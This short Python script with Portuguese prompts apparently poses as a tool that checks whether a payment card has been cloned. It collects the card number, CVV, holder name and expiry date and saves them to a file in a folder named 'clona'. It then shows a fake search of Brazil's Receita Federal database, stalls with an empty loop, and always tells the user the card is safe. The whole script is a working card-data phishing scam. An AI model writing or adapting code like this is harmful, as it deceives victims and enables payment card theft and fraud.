import os

numero = int(input("Digite o número do cartão: "))
cvv = int(input("Digite o cvv do cartão: "))
nome = input("Digite o nome do titular: ")
datavencimento = input("Digite a data de vencimento: ")

with open('clona\dados.txt', 'w') as arquivo:
    arquivo.write(f"{numero}\n")
    arquivo.write(f"{cvv}\n")
    arquivo.write(f"{nome}\n")
    arquivo.write(f"{datavencimento}\n")

print("Pesquisando na base de dados da Receita Federal...")

espera = 0

while espera < 5000000:
    espera += 1

print("Seu cartão não foi clonado!")
